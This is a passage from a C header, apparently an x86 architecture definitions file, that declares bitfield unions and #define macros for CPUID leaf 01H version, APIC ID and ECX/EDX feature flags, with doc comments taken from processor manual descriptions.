#define CPUID_VERSION_INFORMATION_EXTENDED_FAMILY_ID_FLAG            0xFF00000
#define CPUID_VERSION_INFORMATION_EXTENDED_FAMILY_ID_MASK            0xFF
#define CPUID_VERSION_INFORMATION_EXTENDED_FAMILY_ID(_)              (((_) >> 20) & 0xFF)
            UINT32 Reserved2 : 4;
        };

        UINT32 Flags;
    } CpuidVersionInformation;

    /**
     * @brief When CPUID executes with EAX set to 01H, additional information is returned to the EBX register
     */
    union
    {
        struct
        {
            /**
             * [Bits 7:0] This number provides an entry into a brand string table that contains brand strings for IA-32 processors.
             * More information about this field is provided later in this section.
             */
            UINT32 BrandIndex : 8;
#define CPUID_ADDITIONAL_INFORMATION_BRAND_INDEX_BIT                 0
#define CPUID_ADDITIONAL_INFORMATION_BRAND_INDEX_FLAG                0xFF
#define CPUID_ADDITIONAL_INFORMATION_BRAND_INDEX_MASK                0xFF
#define CPUID_ADDITIONAL_INFORMATION_BRAND_INDEX(_)                  (((_) >> 0) & 0xFF)

            /**
             * @brief Value * 8 = cache line size in bytes; used also by CLFLUSHOPT
             *
             * [Bits 15:8] This number indicates the size of the cache line flushed by the CLFLUSH and CLFLUSHOPT instructions in
             * 8-byte increments. This field was introduced in the Pentium 4 processor.
             */
            UINT32 ClflushLineSize : 8;
#define CPUID_ADDITIONAL_INFORMATION_CLFLUSH_LINE_SIZE_BIT           8
#define CPUID_ADDITIONAL_INFORMATION_CLFLUSH_LINE_SIZE_FLAG          0xFF00
#define CPUID_ADDITIONAL_INFORMATION_CLFLUSH_LINE_SIZE_MASK          0xFF
#define CPUID_ADDITIONAL_INFORMATION_CLFLUSH_LINE_SIZE(_)            (((_) >> 8) & 0xFF)

            /**
             * [Bits 23:16] Maximum number of addressable IDs for logical processors in this physical package.
             *
             * @remarks The nearest power-of-2 integer that is not smaller than EBX[23:16] is the number of unique initial APIC IDs
             *          reserved for addressing different logical processors in a physical package. This field is only valid if
             *          CPUID.1.EDX.HTT[bit 28] = 1.
             */
            UINT32 MaxAddressableIds : 8;
#define CPUID_ADDITIONAL_INFORMATION_MAX_ADDRESSABLE_IDS_BIT         16
#define CPUID_ADDITIONAL_INFORMATION_MAX_ADDRESSABLE_IDS_FLAG        0xFF0000
#define CPUID_ADDITIONAL_INFORMATION_MAX_ADDRESSABLE_IDS_MASK        0xFF
#define CPUID_ADDITIONAL_INFORMATION_MAX_ADDRESSABLE_IDS(_)          (((_) >> 16) & 0xFF)

            /**
             * [Bits 31:24] This number is the 8-bit ID that is assigned to the local APIC on the processor during power up. This field
             * was introduced in the Pentium 4 processor.
             */
            UINT32 InitialApicId : 8;
#define CPUID_ADDITIONAL_INFORMATION_INITIAL_APIC_ID_BIT             24
#define CPUID_ADDITIONAL_INFORMATION_INITIAL_APIC_ID_FLAG            0xFF000000
#define CPUID_ADDITIONAL_INFORMATION_INITIAL_APIC_ID_MASK            0xFF
#define CPUID_ADDITIONAL_INFORMATION_INITIAL_APIC_ID(_)              (((_) >> 24) & 0xFF)
        };

        UINT32 Flags;
    } CpuidAdditionalInformation;

    /**
     * @brief When CPUID executes with EAX set to 01H, feature information is returned in ECX and EDX
     */
    union
    {
        struct
        {
            /**
             * @brief Streaming SIMD Extensions 3 (SSE3)
             *
             * [Bit 0] A value of 1 indicates the processor supports this technology.
             */
            UINT32 StreamingSimdExtensions3 : 1;
#define CPUID_FEATURE_INFORMATION_ECX_STREAMING_SIMD_EXTENSIONS_3_BIT 0
#define CPUID_FEATURE_INFORMATION_ECX_STREAMING_SIMD_EXTENSIONS_3_FLAG 0x01
#define CPUID_FEATURE_INFORMATION_ECX_STREAMING_SIMD_EXTENSIONS_3_MASK 0x01
#define CPUID_FEATURE_INFORMATION_ECX_STREAMING_SIMD_EXTENSIONS_3(_) (((_) >> 0) & 0x01)

            /**
             * @brief PCLMULQDQ instruction
             *
             * [Bit 1] A value of 1 indicates the processor supports the PCLMULQDQ instruction.
             */
            UINT32 PclmulqdqInstruction : 1;
#define CPUID_FEATURE_INFORMATION_ECX_PCLMULQDQ_INSTRUCTION_BIT      1
#define CPUID_FEATURE_INFORMATION_ECX_PCLMULQDQ_INSTRUCTION_FLAG     0x02
#define CPUID_FEATURE_INFORMATION_ECX_PCLMULQDQ_INSTRUCTION_MASK     0x01
#define CPUID_FEATURE_INFORMATION_ECX_PCLMULQDQ_INSTRUCTION(_)       (((_) >> 1) & 0x01)

            /**
             * @brief 64-bit DS Area
             *
             * [Bit 2] A value of 1 indicates the processor supports DS area using 64-bit layout.
             */
            UINT32 DsArea64BitLayout : 1;
#define CPUID_FEATURE_INFORMATION_ECX_DS_AREA_64BIT_LAYOUT_BIT       2
#define CPUID_FEATURE_INFORMATION_ECX_DS_AREA_64BIT_LAYOUT_FLAG      0x04
#define CPUID_FEATURE_INFORMATION_ECX_DS_AREA_64BIT_LAYOUT_MASK      0x01
#define CPUID_FEATURE_INFORMATION_ECX_DS_AREA_64BIT_LAYOUT(_)        (((_) >> 2) & 0x01)

            /**
             * @brief MONITOR/MWAIT instruction
             *
             * [Bit 3] A value of 1 indicates the processor supports this feature.
             */
            UINT32 MonitorMwaitInstruction : 1;
#define CPUID_FEATURE_INFORMATION_ECX_MONITOR_MWAIT_INSTRUCTION_BIT  3
#define CPUID_FEATURE_INFORMATION_ECX_MONITOR_MWAIT_INSTRUCTION_FLAG 0x08
#define CPUID_FEATURE_INFORMATION_ECX_MONITOR_MWAIT_INSTRUCTION_MASK 0x01
#define CPUID_FEATURE_INFORMATION_ECX_MONITOR_MWAIT_INSTRUCTION(_)   (((_) >> 3) & 0x01)

            /**
             * @brief CPL Qualified Debug Store
             *
             * [Bit 4] A value of 1 indicates the processor supports the extensions to the Debug Store feature to allow for branch
             * message storage qualified by CPL.
             */
            UINT32 CplQualifiedDebugStore : 1;
#define CPUID_FEATURE_INFORMATION_ECX_CPL_QUALIFIED_DEBUG_STORE_BIT  4
#define CPUID_FEATURE_INFORMATION_ECX_CPL_QUALIFIED_DEBUG_STORE_FLAG 0x10
#define CPUID_FEATURE_INFORMATION_ECX_CPL_QUALIFIED_DEBUG_STORE_MASK 0x01
#define CPUID_FEATURE_INFORMATION_ECX_CPL_QUALIFIED_DEBUG_STORE(_)   (((_) >> 4) & 0x01)

            /**
             * @brief Virtual Machine Extensions
             *
             * [Bit 5] A value of 1 indicates that the processor supports this technology.
             */
            UINT32 VirtualMachineExtensions : 1;
#define CPUID_FEATURE_INFORMATION_ECX_VIRTUAL_MACHINE_EXTENSIONS_BIT 5
#define CPUID_FEATURE_INFORMATION_ECX_VIRTUAL_MACHINE_EXTENSIONS_FLAG 0x20
#define CPUID_FEATURE_INFORMATION_ECX_VIRTUAL_MACHINE_EXTENSIONS_MASK 0x01
#define CPUID_FEATURE_INFORMATION_ECX_VIRTUAL_MACHINE_EXTENSIONS(_)  (((_) >> 5) & 0x01)

            /**
             * @brief Safer Mode Extensions
             *
             * [Bit 6] A value of 1 indicates that the processor supports this technology.
             *
             * @see Vol2[6(SAFER MODE EXTENSIONS REFERENCE)]
             */
            UINT32 SaferModeExtensions : 1;
#define CPUID_FEATURE_INFORMATION_ECX_SAFER_MODE_EXTENSIONS_BIT      6
#define CPUID_FEATURE_INFORMATION_ECX_SAFER_MODE_EXTENSIONS_FLAG     0x40
#define CPUID_FEATURE_INFORMATION_ECX_SAFER_MODE_EXTENSIONS_MASK     0x01
#define CPUID_FEATURE_INFORMATION_ECX_SAFER_MODE_EXTENSIONS(_)       (((_) >> 6) & 0x01)

            /**
             * @brief Enhanced Intel SpeedStep(R) technology
             *
             * [Bit 7] A value of 1 indicates that the processor supports this technology.
             */
            UINT32 EnhancedIntelSpeedstepTechnology : 1;
#define CPUID_FEATURE_INFORMATION_ECX_ENHANCED_INTEL_SPEEDSTEP_TECHNOLOGY_BIT 7
#define CPUID_FEATURE_INFORMATION_ECX_ENHANCED_INTEL_SPEEDSTEP_TECHNOLOGY_FLAG 0x80
#define CPUID_FEATURE_INFORMATION_ECX_ENHANCED_INTEL_SPEEDSTEP_TECHNOLOGY_MASK 0x01
#define CPUID_FEATURE_INFORMATION_ECX_ENHANCED_INTEL_SPEEDSTEP_TECHNOLOGY(_) (((_) >> 7) & 0x01)

            /**
             * @brief Thermal Monitor 2
             *
             * [Bit 8] A value of 1 indicates whether the processor supports this technology.
             */
            UINT32 ThermalMonitor2 : 1;
#define CPUID_FEATURE_INFORMATION_ECX_THERMAL_MONITOR_2_BIT          8
#define CPUID_FEATURE_INFORMATION_ECX_THERMAL_MONITOR_2_FLAG         0x100
#define CPUID_FEATURE_INFORMATION_ECX_THERMAL_MONITOR_2_MASK         0x01
#define CPUID_FEATURE_INFORMATION_ECX_THERMAL_MONITOR_2(_)           (((_) >> 8) & 0x01)

            /**
             * @brief Supplemental Streaming SIMD Extensions 3 (SSSE3)
             *
             * [Bit 9] A value of 1 indicates the presence of the Supplemental Streaming SIMD Extensions 3 (SSSE3). A value of 0
             * indicates the instruction extensions are not present in the processor.
             */
            UINT32 SupplementalStreamingSimdExtensions3 : 1;
#define CPUID_FEATURE_INFORMATION_ECX_SUPPLEMENTAL_STREAMING_SIMD_EXTENSIONS_3_BIT 9
#define CPUID_FEATURE_INFORMATION_ECX_SUPPLEMENTAL_STREAMING_SIMD_EXTENSIONS_3_FLAG 0x200
#define CPUID_FEATURE_INFORMATION_ECX_SUPPLEMENTAL_STREAMING_SIMD_EXTENSIONS_3_MASK 0x01
#define CPUID_FEATURE_INFORMATION_ECX_SUPPLEMENTAL_STREAMING_SIMD_EXTENSIONS_3(_) (((_) >> 9) & 0x01)

            /**
             * @brief L1 Context ID
             *
             * [Bit 10] A value of 1 indicates the L1 data cache mode can be set to either adaptive mode or shared mode. A value of 0
             * indicates this feature is not supported. See definition of the IA32_MISC_ENABLE MSR Bit 24 (L1 Data Cache Context Mode)
             * for details.
             */
            UINT32 L1ContextId : 1;
#define CPUID_FEATURE_INFORMATION_ECX_L1_CONTEXT_ID_BIT              10
#define CPUID_FEATURE_INFORMATION_ECX_L1_CONTEXT_ID_FLAG             0x400
#define CPUID_FEATURE_INFORMATION_ECX_L1_CONTEXT_ID_MASK             0x01
#define CPUID_FEATURE_INFORMATION_ECX_L1_CONTEXT_ID(_)               (((_) >> 10) & 0x01)

            /**
             * @brief IA32_DEBUG_INTERFACE MSR for silicon debug
             *
             * [Bit 11] A value of 1 indicates the processor supports IA32_DEBUG_INTERFACE MSR for silicon debug.
             */
            UINT32 SiliconDebug : 1;
#define CPUID_FEATURE_INFORMATION_ECX_SILICON_DEBUG_BIT              11
#define CPUID_FEATURE_INFORMATION_ECX_SILICON_DEBUG_FLAG             0x800
#define CPUID_FEATURE_INFORMATION_ECX_SILICON_DEBUG_MASK             0x01
#define CPUID_FEATURE_INFORMATION_ECX_SILICON_DEBUG(_)               (((_) >> 11) & 0x01)

            /**
             * @brief FMA extensions using YMM state
             *
             * [Bit 12] A value of 1 indicates the processor supports FMA (Fused Multiple Add) extensions using YMM state.
             */
            UINT32 FmaExtensions : 1;
#define CPUID_FEATURE_INFORMATION_ECX_FMA_EXTENSIONS_BIT             12
#define CPUID_FEATURE_INFORMATION_ECX_FMA_EXTENSIONS_FLAG            0x1000
#define CPUID_FEATURE_INFORMATION_ECX_FMA_EXTENSIONS_MASK            0x01
#define CPUID_FEATURE_INFORMATION_ECX_FMA_EXTENSIONS(_)              (((_) >> 12) & 0x01)

            /**
             * @brief CMPXCHG16B instruction
             *
             * [Bit 13] A value of 1 indicates that the feature is available.
             */
            UINT32 Cmpxchg16BInstruction : 1;
#define CPUID_FEATURE_INFORMATION_ECX_CMPXCHG16B_INSTRUCTION_BIT     13
#define CPUID_FEATURE_INFORMATION_ECX_CMPXCHG16B_INSTRUCTION_FLAG    0x2000
#define CPUID_FEATURE_INFORMATION_ECX_CMPXCHG16B_INSTRUCTION_MASK    0x01
#define CPUID_FEATURE_INFORMATION_ECX_CMPXCHG16B_INSTRUCTION(_)      (((_) >> 13) & 0x01)

            /**
             * @brief xTPR Update Control
             *
             * [Bit 14] A value of 1 indicates that the processor supports changing IA32_MISC_ENABLE[bit 23].
             */
            UINT32 XtprUpdateControl : 1;
#define CPUID_FEATURE_INFORMATION_ECX_XTPR_UPDATE_CONTROL_BIT        14
#define CPUID_FEATURE_INFORMATION_ECX_XTPR_UPDATE_CONTROL_FLAG       0x4000
#define CPUID_FEATURE_INFORMATION_ECX_XTPR_UPDATE_CONTROL_MASK       0x01
#define CPUID_FEATURE_INFORMATION_ECX_XTPR_UPDATE_CONTROL(_)         (((_) >> 14) & 0x01)

            /**
             * @brief Perfmon and Debug Capability
             *
             * [Bit 15] A value of 1 indicates the processor supports the performance and debug feature indication MSR
             * IA32_PERF_CAPABILITIES.
             */
            UINT32 PerfmonAndDebugCapability : 1;
#define CPUID_FEATURE_INFORMATION_ECX_PERFMON_AND_DEBUG_CAPABILITY_BIT 15
#define CPUID_FEATURE_INFORMATION_ECX_PERFMON_AND_DEBUG_CAPABILITY_FLAG 0x8000
#define CPUID_FEATURE_INFORMATION_ECX_PERFMON_AND_DEBUG_CAPABILITY_MASK 0x01
#define CPUID_FEATURE_INFORMATION_ECX_PERFMON_AND_DEBUG_CAPABILITY(_) (((_) >> 15) & 0x01)
            UINT32 Reserved1 : 1;

            /**
             * @brief Process-context identifiers
             *
             * [Bit 17] A value of 1 indicates that the processor supports PCIDs and that software may set CR4.PCIDE to 1.
             */
            UINT32 ProcessContextIdentifiers : 1;
#define CPUID_FEATURE_INFORMATION_ECX_PROCESS_CONTEXT_IDENTIFIERS_BIT 17
#define CPUID_FEATURE_INFORMATION_ECX_PROCESS_CONTEXT_IDENTIFIERS_FLAG 0x20000
#define CPUID_FEATURE_INFORMATION_ECX_PROCESS_CONTEXT_IDENTIFIERS_MASK 0x01
#define CPUID_FEATURE_INFORMATION_ECX_PROCESS_CONTEXT_IDENTIFIERS(_) (((_) >> 17) & 0x01)

            /**
             * @brief Direct Cache Access
             *
             * [Bit 18] A value of 1 indicates the processor supports the ability to prefetch data from a memory mapped device (Direct
             * Cache Access).
             */
            UINT32 DirectCacheAccess : 1;
#define CPUID_FEATURE_INFORMATION_ECX_DIRECT_CACHE_ACCESS_BIT        18
#define CPUID_FEATURE_INFORMATION_ECX_DIRECT_CACHE_ACCESS_FLAG       0x40000
#define CPUID_FEATURE_INFORMATION_ECX_DIRECT_CACHE_ACCESS_MASK       0x01
#define CPUID_FEATURE_INFORMATION_ECX_DIRECT_CACHE_ACCESS(_)         (((_) >> 18) & 0x01)

            /**
             * @brief SSE4.1 support
             *
             * [Bit 19] A value of 1 indicates that the processor supports SSE4.1.
             */
            UINT32 Sse41Support : 1;
#define CPUID_FEATURE_INFORMATION_ECX_SSE41_SUPPORT_BIT              19
#define CPUID_FEATURE_INFORMATION_ECX_SSE41_SUPPORT_FLAG             0x80000
#define CPUID_FEATURE_INFORMATION_ECX_SSE41_SUPPORT_MASK             0x01
#define CPUID_FEATURE_INFORMATION_ECX_SSE41_SUPPORT(_)               (((_) >> 19) & 0x01)

            /**
             * @brief SSE4.2 support
             *
             * [Bit 20] A value of 1 indicates that the processor supports SSE4.2.
             */
            UINT32 Sse42Support : 1;
#define CPUID_FEATURE_INFORMATION_ECX_SSE42_SUPPORT_BIT              20
#define CPUID_FEATURE_INFORMATION_ECX_SSE42_SUPPORT_FLAG             0x100000
#define CPUID_FEATURE_INFORMATION_ECX_SSE42_SUPPORT_MASK             0x01
#define CPUID_FEATURE_INFORMATION_ECX_SSE42_SUPPORT(_)               (((_) >> 20) & 0x01)

            /**
             * @brief x2APIC support
             *
             * [Bit 21] A value of 1 indicates that the processor supports x2APIC feature.
             */
            UINT32 X2ApicSupport : 1;
#define CPUID_FEATURE_INFORMATION_ECX_X2APIC_SUPPORT_BIT             21
#define CPUID_FEATURE_INFORMATION_ECX_X2APIC_SUPPORT_FLAG            0x200000
#define CPUID_FEATURE_INFORMATION_ECX_X2APIC_SUPPORT_MASK            0x01
#define CPUID_FEATURE_INFORMATION_ECX_X2APIC_SUPPORT(_)              (((_) >> 21) & 0x01)

            /**
             * @brief MOVBE instruction
             *
             * [Bit 22] A value of 1 indicates that the processor supports MOVBE instruction.
             */
            UINT32 MovbeInstruction : 1;
#define CPUID_FEATURE_INFORMATION_ECX_MOVBE_INSTRUCTION_BIT          22
#define CPUID_FEATURE_INFORMATION_ECX_MOVBE_INSTRUCTION_FLAG         0x400000
#define CPUID_FEATURE_INFORMATION_ECX_MOVBE_INSTRUCTION_MASK         0x01
#define CPUID_FEATURE_INFORMATION_ECX_MOVBE_INSTRUCTION(_)           (((_) >> 22) & 0x01)

            /**
             * @brief POPCNT instruction
             *
             * [Bit 23] A value of 1 indicates that the processor supports the POPCNT instruction.
             */
            UINT32 PopcntInstruction : 1;
#define CPUID_FEATURE_INFORMATION_ECX_POPCNT_INSTRUCTION_BIT         23
#define CPUID_FEATURE_INFORMATION_ECX_POPCNT_INSTRUCTION_FLAG        0x800000
#define CPUID_FEATURE_INFORMATION_ECX_POPCNT_INSTRUCTION_MASK        0x01
#define CPUID_FEATURE_INFORMATION_ECX_POPCNT_INSTRUCTION(_)          (((_) >> 23) & 0x01)

            /**
             * @brief TSC Deadline
             *
             * [Bit 24] A value of 1 indicates that the processor's local APIC timer supports one-shot operation using a TSC deadline
             * value.
             */
            UINT32 TscDeadline : 1;
#define CPUID_FEATURE_INFORMATION_ECX_TSC_DEADLINE_BIT               24
#define CPUID_FEATURE_INFORMATION_ECX_TSC_DEADLINE_FLAG              0x1000000
#define CPUID_FEATURE_INFORMATION_ECX_TSC_DEADLINE_MASK              0x01
#define CPUID_FEATURE_INFORMATION_ECX_TSC_DEADLINE(_)                (((_) >> 24) & 0x01)

            /**
             * @brief AESNI instruction extensions
             *
             * [Bit 25] A value of 1 indicates that the processor supports the AESNI instruction extensions.
             */
            UINT32 AesniInstructionExtensions : 1;
#define CPUID_FEATURE_INFORMATION_ECX_AESNI_INSTRUCTION_EXTENSIONS_BIT 25
#define CPUID_FEATURE_INFORMATION_ECX_AESNI_INSTRUCTION_EXTENSIONS_FLAG 0x2000000
#define CPUID_FEATURE_INFORMATION_ECX_AESNI_INSTRUCTION_EXTENSIONS_MASK 0x01
#define CPUID_FEATURE_INFORMATION_ECX_AESNI_INSTRUCTION_EXTENSIONS(_) (((_) >> 25) & 0x01)

            /**
             * @brief XSAVE/XRSTOR instruction extensions
             *
             * [Bit 26] A value of 1 indicates that the processor supports the XSAVE/XRSTOR processor extended states feature, the
             * XSETBV/XGETBV instructions, and XCR0.
             */
            UINT32 XsaveXrstorInstruction : 1;
#define CPUID_FEATURE_INFORMATION_ECX_XSAVE_XRSTOR_INSTRUCTION_BIT   26
#define CPUID_FEATURE_INFORMATION_ECX_XSAVE_XRSTOR_INSTRUCTION_FLAG  0x4000000
#define CPUID_FEATURE_INFORMATION_ECX_XSAVE_XRSTOR_INSTRUCTION_MASK  0x01
#define CPUID_FEATURE_INFORMATION_ECX_XSAVE_XRSTOR_INSTRUCTION(_)    (((_) >> 26) & 0x01)

            /**
             * @brief CR4.OSXSAVE[bit 18] set
             *
             * [Bit 27] A value of 1 indicates that the OS has set CR4.OSXSAVE[bit 18] to enable XSETBV/XGETBV instructions to access
             * XCR0 and to support processor extended state management using XSAVE/XRSTOR.
             */
            UINT32 OsxSave : 1;
#define CPUID_FEATURE_INFORMATION_ECX_OSX_SAVE_BIT                   27
#define CPUID_FEATURE_INFORMATION_ECX_OSX_SAVE_FLAG                  0x8000000
#define CPUID_FEATURE_INFORMATION_ECX_OSX_SAVE_MASK                  0x01
#define CPUID_FEATURE_INFORMATION_ECX_OSX_SAVE(_)                    (((_) >> 27) & 0x01)

            /**
             * @brief AVX instruction extensions support
             *
             * [Bit 28] A value of 1 indicates the processor supports the AVX instruction extensions.
             */
            UINT32 AvxSupport : 1;
#define CPUID_FEATURE_INFORMATION_ECX_AVX_SUPPORT_BIT                28
#define CPUID_FEATURE_INFORMATION_ECX_AVX_SUPPORT_FLAG               0x10000000
#define CPUID_FEATURE_INFORMATION_ECX_AVX_SUPPORT_MASK               0x01
#define CPUID_FEATURE_INFORMATION_ECX_AVX_SUPPORT(_)                 (((_) >> 28) & 0x01)

            /**
             * @brief 16-bit floating-point conversion instructions support
             *
             * [Bit 29] A value of 1 indicates that processor supports 16-bit floating-point conversion instructions.
             */
            UINT32 HalfPrecisionConversionInstructions : 1;
#define CPUID_FEATURE_INFORMATION_ECX_HALF_PRECISION_CONVERSION_INSTRUCTIONS_BIT 29
#define CPUID_FEATURE_INFORMATION_ECX_HALF_PRECISION_CONVERSION_INSTRUCTIONS_FLAG 0x20000000
#define CPUID_FEATURE_INFORMATION_ECX_HALF_PRECISION_CONVERSION_INSTRUCTIONS_MASK 0x01
#define CPUID_FEATURE_INFORMATION_ECX_HALF_PRECISION_CONVERSION_INSTRUCTIONS(_) (((_) >> 29) & 0x01)

            /**
             * @brief RDRAND instruction support
             *
             * [Bit 30] A value of 1 indicates that processor supports RDRAND instruction.
             */
            UINT32 RdrandInstruction : 1;
#define CPUID_FEATURE_INFORMATION_ECX_RDRAND_INSTRUCTION_BIT         30
#define CPUID_FEATURE_INFORMATION_ECX_RDRAND_INSTRUCTION_FLAG        0x40000000
#define CPUID_FEATURE_INFORMATION_ECX_RDRAND_INSTRUCTION_MASK        0x01
#define CPUID_FEATURE_INFORMATION_ECX_RDRAND_INSTRUCTION(_)          (((_) >> 30) & 0x01)
            UINT32 Reserved2 : 1;
        };

        UINT32 Flags;
    } CpuidFeatureInformationEcx;

    /**
     * @brief When CPUID executes with EAX set to 01H, feature information is returned in ECX and EDX
     */
    union
    {
        struct
        {
            /**
             * @brief Floating Point Unit On-Chip
             *
             * [Bit 0] The processor contains an x87 FPU.
             */
            UINT32 FloatingPointUnitOnChip : 1;
#define CPUID_FEATURE_INFORMATION_EDX_FLOATING_POINT_UNIT_ON_CHIP_BIT 0
#define CPUID_FEATURE_INFORMATION_EDX_FLOATING_POINT_UNIT_ON_CHIP_FLAG 0x01
#define CPUID_FEATURE_INFORMATION_EDX_FLOATING_POINT_UNIT_ON_CHIP_MASK 0x01
#define CPUID_FEATURE_INFORMATION_EDX_FLOATING_POINT_UNIT_ON_CHIP(_) (((_) >> 0) & 0x01)

            /**
             * @brief Virtual 8086 Mode Enhancements
             *
             * [Bit 1] Virtual 8086 mode enhancements, including CR4.VME for controlling the feature, CR4.PVI for protected mode
             * virtual interrupts, software interrupt indirection, expansion of the TSS with the software indirection bitmap, and
             * EFLAGS.VIF and EFLAGS.VIP flags.
             */
            UINT32 Virtual8086ModeEnhancements : 1;
#define CPUID_FEATURE_INFORMATION_EDX_VIRTUAL_8086_MODE_ENHANCEMENTS_BIT 1
#define CPUID_FEATURE_INFORMATION_EDX_VIRTUAL_8086_MODE_ENHANCEMENTS_FLAG 0x02
#define CPUID_FEATURE_INFORMATION_EDX_VIRTUAL_8086_MODE_ENHANCEMENTS_MASK 0x01
#define CPUID_FEATURE_INFORMATION_EDX_VIRTUAL_8086_MODE_ENHANCEMENTS(_) (((_) >> 1) & 0x01)

            /**
             * @brief Debugging Extensions
             *
             * [Bit 2] Support for I/O breakpoints, including CR4.DE for controlling the feature, and optional trapping of accesses to
             * DR4 and DR5.
             */
            UINT32 DebuggingExtensions : 1;
#define CPUID_FEATURE_INFORMATION_EDX_DEBUGGING_EXTENSIONS_BIT       2
#define CPUID_FEATURE_INFORMATION_EDX_DEBUGGING_EXTENSIONS_FLAG      0x04
#define CPUID_FEATURE_INFORMATION_EDX_DEBUGGING_EXTENSIONS_MASK      0x01
#define CPUID_FEATURE_INFORMATION_EDX_DEBUGGING_EXTENSIONS(_)        (((_) >> 2) & 0x01)

            /**
             * @brief Page Size Extension
             *
             * [Bit 3] Large pages of size 4 MByte are supported, including CR4.PSE for controlling the feature, the defined dirty bit
             * in PDE (Page Directory Entries), optional reserved bit trapping in CR3, PDEs, and PTEs.
             */
            UINT32 PageSizeExtension : 1;
#define CPUID_FEATURE_INFORMATION_EDX_PAGE_SIZE_EXTENSION_BIT        3
#define CPUID_FEATURE_INFORMATION_EDX_PAGE_SIZE_EXTENSION_FLAG       0x08
#define CPUID_FEATURE_INFORMATION_EDX_PAGE_SIZE_EXTENSION_MASK       0x01
#define CPUID_FEATURE_INFORMATION_EDX_PAGE_SIZE_EXTENSION(_)         (((_) >> 3) & 0x01)

            /**
             * @brief Time Stamp Counter
             *
             * [Bit 4] The RDTSC instruction is supported, including CR4.TSD for controlling privilege.
             */
            UINT32 TimestampCounter : 1;
#define CPUID_FEATURE_INFORMATION_EDX_TIMESTAMP_COUNTER_BIT          4
#define CPUID_FEATURE_INFORMATION_EDX_TIMESTAMP_COUNTER_FLAG         0x10
#define CPUID_FEATURE_INFORMATION_EDX_TIMESTAMP_COUNTER_MASK         0x01
#define CPUID_FEATURE_INFORMATION_EDX_TIMESTAMP_COUNTER(_)           (((_) >> 4) & 0x01)

            /**
             * @brief Model Specific Registers RDMSR and WRMSR Instructions
             *
             * [Bit 5] The RDMSR and WRMSR instructions are supported. Some of the MSRs are implementation dependent.
             */
            UINT32 RdmsrWrmsrInstructions : 1;
#define CPUID_FEATURE_INFORMATION_EDX_RDMSR_WRMSR_INSTRUCTIONS_BIT   5
#define CPUID_FEATURE_INFORMATION_EDX_RDMSR_WRMSR_INSTRUCTIONS_FLAG  0x20
#define CPUID_FEATURE_INFORMATION_EDX_RDMSR_WRMSR_INSTRUCTIONS_MASK  0x01
#define CPUID_FEATURE_INFORMATION_EDX_RDMSR_WRMSR_INSTRUCTIONS(_)    (((_) >> 5) & 0x01)

            /**
             * @brief Physical Address Extension
             *
             * [Bit 6] Physical addresses greater than 32 bits are supported: extended page table entry formats, an extra level in the
             * page translation tables is defined, 2-MByte pages are supported instead of 4 Mbyte pages if PAE bit is 1.
             */
            UINT32 PhysicalAddressExtension : 1;
#define CPUID_FEATURE_INFORMATION_EDX_PHYSICAL_ADDRESS_EXTENSION_BIT 6
#define CPUID_FEATURE_INFORMATION_EDX_PHYSICAL_ADDRESS_EXTENSION_FLAG 0x40
#define CPUID_FEATURE_INFORMATION_EDX_PHYSICAL_ADDRESS_EXTENSION_MASK 0x01
#define CPUID_FEATURE_INFORMATION_EDX_PHYSICAL_ADDRESS_EXTENSION(_)  (((_) >> 6) & 0x01)

            /**
             * @brief Machine Check Exception
             *
             * [Bit 7] Exception 18 is defined for Machine Checks, including CR4.MCE for controlling the feature. This feature does not
             * define the model-specific implementations of machine-check error logging, reporting, and processor shutdowns. Machine
             * Check exception handlers may have to depend on processor version to do model specific processing of the exception, or
             * test for the presence of the Machine Check feature.
             */
            UINT32 MachineCheckException : 1;
#define CPUID_FEATURE_INFORMATION_EDX_MACHINE_CHECK_EXCEPTION_BIT    7
#define CPUID_FEATURE_INFORMATION_EDX_MACHINE_CHECK_EXCEPTION_FLAG   0x80
#define CPUID_FEATURE_INFORMATION_EDX_MACHINE_CHECK_EXCEPTION_MASK   0x01
#define CPUID_FEATURE_INFORMATION_EDX_MACHINE_CHECK_EXCEPTION(_)     (((_) >> 7) & 0x01)

            /**
             * @brief CMPXCHG8B Instruction
             *
             * [Bit 8] The compare-and-exchange 8 bytes (64 bits) instruction is supported (implicitly locked and atomic).
             */
            UINT32 Cmpxchg8B : 1;
#define CPUID_FEATURE_INFORMATION_EDX_CMPXCHG8B_BIT                  8
#define CPUID_FEATURE_INFORMATION_EDX_CMPXCHG8B_FLAG                 0x100
#define CPUID_FEATURE_INFORMATION_EDX_CMPXCHG8B_MASK                 0x01
#define CPUID_FEATURE_INFORMATION_EDX_CMPXCHG8B(_)                   (((_) >> 8) & 0x01)

            /**
             * @brief APIC On-Chip
             *
             * [Bit 9] The processor contains an Advanced Programmable Interrupt Controller (APIC), responding to memory mapped
             * commands in the physical address range FFFE0000H to FFFE0FFFH (by default - some processors permit the APIC to be
             * relocated).
             */
            UINT32 ApicOnChip : 1;
#define CPUID_FEATURE_INFORMATION_EDX_APIC_ON_CHIP_BIT               9
#define CPUID_FEATURE_INFORMATION_EDX_APIC_ON_CHIP_FLAG              0x200
#define CPUID_FEATURE_INFORMATION_EDX_APIC_ON_CHIP_MASK              0x01
#define CPUID_FEATURE_INFORMATION_EDX_APIC_ON_CHIP(_)                (((_) >> 9) & 0x01)
            UINT32 Reserved1 : 1;

            /**
             * @brief SYSENTER and SYSEXIT Instructions
             *
             * [Bit 11] The SYSENTER and SYSEXIT and associated MSRs are supported.
             */
            UINT32 SysenterSysexitInstructions : 1;
#define CPUID_FEATURE_INFORMATION_EDX_SYSENTER_SYSEXIT_INSTRUCTIONS_BIT 11
#define CPUID_FEATURE_INFORMATION_EDX_SYSENTER_SYSEXIT_INSTRUCTIONS_FLAG 0x800
#define CPUID_FEATURE_INFORMATION_EDX_SYSENTER_SYSEXIT_INSTRUCTIONS_MASK 0x01
#define CPUID_FEATURE_INFORMATION_EDX_SYSENTER_SYSEXIT_INSTRUCTIONS(_) (((_) >> 11) & 0x01)

            /**
             * @brief Memory Type Range Registers
             *
             * [Bit 12] MTRRs are supported. The MTRRcap MSR contains feature bits that describe what memory types are supported, how
             * many variable MTRRs are supported, and whether fixed MTRRs are supported.
             */
            UINT32 MemoryTypeRangeRegisters : 1;
#define CPUID_FEATURE_INFORMATION_EDX_MEMORY_TYPE_RANGE_REGISTERS_BIT 12
#define CPUID_FEATURE_INFORMATION_EDX_MEMORY_TYPE_RANGE_REGISTERS_FLAG 0x1000
#define CPUID_FEATURE_INFORMATION_EDX_MEMORY_TYPE_RANGE_REGISTERS_MASK 0x01
#define CPUID_FEATURE_INFORMATION_EDX_MEMORY_TYPE_RANGE_REGISTERS(_) (((_) >> 12) & 0x01)

            /**
             * @brief Page Global Bit
